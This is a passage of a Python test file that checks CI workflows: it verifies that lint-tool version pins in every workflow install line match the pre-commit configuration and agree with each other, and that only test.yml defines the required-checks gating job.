                sites.append((f"{path.name}:{lineno}", pins))
    return sites


def test_every_lint_pin_site_in_every_workflow_agrees_with_precommit() -> None:
    """All lint pins, everywhere, match ``.pre-commit-config.yaml``.

    Rule 1 checks the single named ``Install lint tools`` step. This one
    checks every install line in every workflow, which is the check that
    would have caught #224 and which also covers the auto-update
    workflows on the day they land -- rather than one incident later.
    """

    precommit = _extract_precommit_pins()
    sites = _iter_all_lint_pin_sites()
    assert sites, (
        "No ==-pinned lint installs found in any workflow. Either the "
        "pinning convention changed or this scan's regex went stale -- "
        "either way the drift guard is no longer guarding anything."
    )

    mismatches: list[str] = []
    for location, pins in sites:
        for tool, version in sorted(pins.items()):
            expected = precommit.get(tool)
            if expected is not None and expected != version:
                mismatches.append(f"  {location}: {tool}=={version}, pre-commit pins {expected}")

    assert not mismatches, (
        "Lint-tool pins drift between a workflow install site and "
        ".pre-commit-config.yaml. Every site must agree, not just the one "
        "named step Rule 1 reads:\n" + "\n".join(mismatches)
    )


def test_all_lint_pin_sites_agree_with_each_other() -> None:
    """Two install sites in CI must not pin different versions of a tool.

    ``test.yml`` installs the lint trio at two separate steps. If they
    drift, one job lints with ruff X and another with ruff Y, and the same
    file can pass one and fail the other.
    """

    sites = _iter_all_lint_pin_sites()
    seen: dict[str, tuple[str, str]] = {}
    conflicts: list[str] = []
    for location, pins in sites:
        for tool, version in sorted(pins.items()):
            previous = seen.get(tool)
            if previous is None:
                seen[tool] = (location, version)
            elif previous[1] != version:
                conflicts.append(
                    f"  {tool}: {previous[0]} pins {previous[1]}, {location} pins {version}"
                )

    assert not conflicts, (
        "The same lint tool is pinned to different versions at different "
        "workflow install sites:\n" + "\n".join(conflicts)
    )


def test_only_test_workflow_joins_required_checks() -> None:
    """The scope map's gate column must match reality.

    Branch protection requires only ``test.yml``'s ``required-checks``
    aggregate. This pins that no other workflow has quietly grown one --
    a second aggregate would look like a gate in the Actions UI while
    branch protection ignored it.
    """

    claimed = {name for name, (_, gated) in _WORKFLOW_SCOPE_MAP.items() if gated}
    assert claimed == {"test.yml"}, (
        "The scope map claims a workflow other than test.yml joins the "
        f"required-checks gate: {sorted(claimed)}. Branch protection "
        "requires only test.yml's aggregate."
    )

    actual = {
        name
        for name in sorted(_WORKFLOW_SCOPE_MAP)
        if "required-checks" in (_load_workflow(name).get("jobs") or {})
    }
    assert actual == claimed, (
        "A workflow defines a `required-checks` job but the scope map does "
        f"not mark it as gating (or vice versa). On disk: {sorted(actual)}; "
        f"claimed: {sorted(claimed)}."
    )
